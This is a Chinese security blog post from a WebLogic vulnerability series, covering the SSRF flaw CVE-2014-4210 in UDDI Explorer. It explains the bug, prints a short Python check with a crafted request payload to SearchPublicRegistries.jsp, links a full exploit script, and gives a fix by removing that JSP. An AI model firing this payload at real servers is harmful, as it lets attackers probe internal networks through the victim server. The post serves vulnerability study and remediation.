# weblogic 系列漏洞整理 -- 5\. weblogic SSRF 漏洞 UDDI Explorer 对外开放 (CVE-2014-4210) - 0x4D75 - 博客园

> 原文：[`www.cnblogs.com/0x4D75/p/8966895.html`](https://www.cnblogs.com/0x4D75/p/8966895.html)

> 一、weblogic 安装 [`www.cnblogs.com/0x4D75/p/8916428.html`](http://www.cnblogs.com/0x4D75/p/8916428.html)
> 
> 二、weblogic 弱口令 [`www.cnblogs.com/0x4D75/p/8918761.html`](http://www.cnblogs.com/0x4D75/p/8918761.html)
> 
> 三、weblogic 后台提权 [`www.cnblogs.com/0x4D75/p/8919760.html`](http://www.cnblogs.com/0x4D75/p/8919760.html)
> 
> 四、weblogic XMLDecoder 反序列化漏洞 [`www.cnblogs.com/0x4D75/p/8933028.html`](http://www.cnblogs.com/0x4D75/p/8933028.html)

目录

*   五、 weblogic SSRF 漏洞 UDDI Explorer 对外开放 (CVE-2014-4210)
    *   1\. 利用过程
    *   2\. 修复建议

## 五、 weblogic SSRF 漏洞 UDDI Explorer 对外开放 (CVE-2014-4210)

**影响版本：10.0.2,10.3.6**

SSRF 漏洞，也称为 XSPA（跨站端口攻击），问题存在于应用程序在加载用户提供的 URL 时，没能正确验证服务器的响应，然后就反馈回了客户端。攻击者可以利用该漏洞绕过访问限制（如防火墙），进而将受感染的服务器作为代理进行端口扫描，甚至访问系统中的数据。

### 1\. 利用过程

完整利用脚本：[`github.com/b4zinga/Explib/blob/master/weblogic.py`](https://github.com/b4zinga/Explib/blob/master/weblogic.py)

```
def ssrf(self):
        """Version: 10.0.2/10.3.6
        CVE-2014-4210"""
        # payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
        payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"

        req = requests.get(self.url+payload, timeout=10, verify=False)
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
            print("[+] WebLogic ssrf") 
```

### 2\. 修复建议

​ Weblogic 服务端请求伪造漏洞出现在 UDDI 组件（所以安装 Weblogic 时如果没有选择 UDDI 组件那么就不会有该漏洞），更准确地说是 UDDI 包实现包 uddiexplorer.war 下的 SearchPublicRegistries.jsp。

​ 所以修复这个漏洞最直接的方式就是删除这个 jsp 页面。

```
jar -xvf uddiexplorer.war 
rm  SearchPublicRegistries.jsp
jar -cvfM uddiexplorer.war uddiexplorer/ 
```